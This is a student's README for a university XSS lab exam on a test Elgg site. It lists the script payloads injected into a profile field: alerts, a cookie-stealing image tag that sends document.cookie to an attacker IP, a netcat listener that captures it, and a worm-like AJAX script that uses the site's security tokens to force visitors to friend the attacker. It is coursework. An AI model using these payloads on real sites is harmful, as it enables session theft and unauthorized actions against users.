READ ME FOR LAB 3 (FINAL EXAM) By Demetrius Johnson -  12-5-2022

Note I have placed the code that I used below including where the code was injected: 
**All code injected into the “About me” section of the attacker’s profile;
**The netcat command (program) was ran on the attackers command line interface.

-----------------------CODE----------------------------------------------:


Display “XSS” through webpage alert:

<script>alert(‘XSS’);</script>



Display cookie through webpage alert:

<script>alert(document.cookie);</script>




Send cookie to attacker via get request:

<script>document.write(’<img src=http://10.0.2.15:5555?c=’
+ escape(document.cookie) + ’ >’);
</script>

•	Command issued on attacker machine command line acting as a server to listen to the get request messages and obtain the cookie embedded in the request:
o	$netcat -l 5555 -v






Code injected so that any user who visit’s attacker’s page will in the background run a script that will add attacker’s profile as a friend:

<script type="text/javascript">
window.onload = function () {
var Ajax=null; //reset Ajax object
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; //time stamp secret security token embedded in page
var token="&__elgg_token="+elgg.security.token.__elgg_token; //secutiry token hidden in page
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET",sendurl,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send();
}
</script>
•	Note that the AJAX code is used to update the current page that the user is on (i.e. if you add a friend), AJAX code is also used to officially send the get request and then update the source code to change “add friend” to “friend”.
